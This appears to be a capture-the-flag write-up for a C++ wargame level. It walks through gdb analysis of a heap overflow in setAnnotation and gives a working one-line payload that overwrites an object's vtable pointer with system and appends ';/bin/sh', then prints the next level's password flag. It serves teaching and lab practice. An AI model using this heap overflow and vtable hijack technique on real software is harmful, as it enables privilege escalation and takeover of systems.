## C++ is bad too (level9)

This level's [binary](source.cpp) is written in C++. It contains an _N_ class
which stores a 100-bytes long character buffer and an int. The character buffer
contents are set with the _setAnnotation_ method. So this binary takes at least
one argument (or it exits) and creates two instances of the class with C++'s
"new" keyword. This basically performs an allocation and sets the int member of
the struct to the given value. There is also two operator functions, one for '+'
and an other for '-', which simply adds or substracts the int member values and
returns the result as an int.

So the 2 N instances, let's call them _a_ and _b_, are initialized with 5 and 6
respectively. Then the _setAnnotation_ method is called on _a_ and it copies the
argument provided by the user directly to the member buffer without checking its
length which makes this susceptible to a buffer overflow attack.

Lets see the memory layout after all this:

```shell
# run gdb on the binary
gdb ./level9
# disassemble main to see where to break
(gdb) disass main
...
   0x08048610 <+28>:    movl   $0x6c,(%esp)
   0x08048617 <+35>:    call   0x8048530 <_Znwj@plt> # a is allocated
   0x0804861c <+40>:    mov    %eax,%ebx
   0x0804861e <+42>:    movl   $0x5,0x4(%esp)
   0x08048626 <+50>:    mov    %ebx,(%esp)
   0x08048629 <+53>:    call   0x80486f6 <_ZN1NC2Ei> # a is initialized to 5
...
   0x08048632 <+62>:    movl   $0x6c,(%esp)
   0x08048639 <+69>:    call   0x8048530 <_Znwj@plt> # b is allocated
   0x0804863e <+74>:    mov    %eax,%ebx
   0x08048640 <+76>:    movl   $0x6,0x4(%esp)
   0x08048648 <+84>:    mov    %ebx,(%esp)
   0x0804864b <+87>:    call   0x80486f6 <_ZN1NC2Ei> # b is initialized to 6
...
   0x08048674 <+128>:   mov    %eax,(%esp)
   0x08048677 <+131>:   call   0x804870e <_ZN1N13setAnnotationEPc>
   0x0804867c <+136>:   mov    0x10(%esp),%eax
...
# break after a's allocation to get its address
(gdb) b *0x0804861c
Breakpoint 1 at 0x0804861c
# break after b's allocation for the same reason
(gdb) b *0x0804863e
Breakpoint 2 at 0x0804863e
# break after the setAnnotation call
(gdb) b *0x0804867c
Breakpoint 3 at 0x804867c
# start the program with an argument
(gdb) run "aaaabbbbccccddddeeeefghijklm"
Starting program: /home/user/level9/level9 "aaaabbbbccccddddeeeefghijklm"

Breakpoint 1, 0x0804861c in main ()
# see a's address
(gdb) x $eax
0x804a008:      0x00000000
# go to second breakpoint
(gdb) c
Continuing.

Breakpoint 2, 0x0804863e in main ()
# see b's address
(gdb) x $eax
0x804a078:      0x00000000
# go to last breakpoint
(gdb) c
Continuing.

Breakpoint 3, 0x0804867c in main ()
```

Now from there we can see that b is located 112 bytes after _a_. This makes
sense since the allocation function in both cases takes a parameter set to
"0x6c", 108 in decimal, which we can guess is the size of the class instance.
From these informations we can see the memory layout of _a_ and _b_:

```
# print 224 bytes of memory starting from a's address
(gdb) x/56wx 0x804a008
0x804a008:      0x08048848      0x61616161      0x62626262      0x63636363
0x804a018:      0x64646464      0x65656565      0x69686766      0x6d6c6b6a
0x804a028:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a038:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a048:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a058:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a068:      0x00000000      0x00000000      0x00000005      0x00000071
0x804a078:      0x08048848      0x00000000      0x00000000      0x00000000
0x804a088:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a098:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0a8:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0b8:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0c8:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0d8:      0x00000000      0x00000000      0x00000006      0x00020f21
```

We can see the character buffer from the second word on the first line up to the
end of the second line (from 0x804a00c to 0x804a028), and that it is filled with
our input as expected. At the end of the 7th line there is a word containing the
value 5 (at 0x804a070) which was _a_'s initialization value. _b_ is layed out
simirlarly but with an empty character buffer and its value set to 6 on the last
line (at 0x804a0e0).

Also, both _a_ and _b_ start with the same value 0x08048848. It is the first
word and we can see it again 7 lines down at _b_'s address (0x804a078). If we
check it out, we can see that it points to the address of a function:

```shell
(gdb) x 0x08048848
0x8048848 <_ZTV1N+8>:   0x0804873a
(gdb) x 0x0804873a
0x804873a <_ZN1NplERS_>:        0x8be58955
(gdb) disass _ZN1NplERS_
Dump of assembler code for function _ZN1NplERS_:
   0x0804873a <+0>:     push   %ebp
   0x0804873b <+1>:     mov    %esp,%ebp
   0x0804873d <+3>:     mov    0x8(%ebp),%eax
   0x08048740 <+6>:     mov    0x68(%eax),%edx
   0x08048743 <+9>:     mov    0xc(%ebp),%eax
   0x08048746 <+12>:    mov    0x68(%eax),%eax
   0x08048749 <+15>:    add    %edx,%eax
   0x0804874b <+17>:    pop    %ebp
   0x0804874c <+18>:    ret
End of assembler dump.
```

This really short function takes two parameters, fetches a value at an offset of
0x68 (104) bytes and adds them. This precisely where the numeric value of the
_N_ class is located. So this is the '+' operator for the class. At the next
address, 4 bytes after we have the '-' operator:

```shell
(gdb) x 0x804874e
0x804874e <_ZN1NmiERS_>:        0x8be58955
```

If we overwrite this value by providing the right payload to the binary, the
program segfaults because _b_'s '+' operator is used at the end of the program.

```shell
./level9 "$(python -c 'print "a" * 108 + "bbbb"')"
Segmentation fault (core dumped)
```

So now the exploit. Since the operator is loaded through a pointer to a function
address situated at the start of _b_, what we need to do is overwrite this value
with a valid address whose value is the address of the system function. _b_'s
address is not only where the operator function is located but it is also the
first argument of the operator function (this is what _this_ is, a pointer to
the instance of the class calling the method). So it will be the argument for
system too. Obviously the raw bytes of the address pointing to system are not a
valid shell command, so we need to add a separator and end the string with the
program we want to launch.

| system (4) | padding (104) | _b_'s address (4) | end the command string (9) |
|------------|---------------|-------------------|----------------------------|
| 0xb7d86060 | 0x909090...   | 0x0804a00c        | ";/bin/sh"                 |

```shell
# run the exploit
./level9 $(python -c 'print "\xb7\xd8\x60\x60"[::-1] + "\x90" * 104 + "\x08\x04\xa0\x0c"[::-1] + ";/bin/sh"')
# enjoy
whoami
bonus0
# your flag
cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```
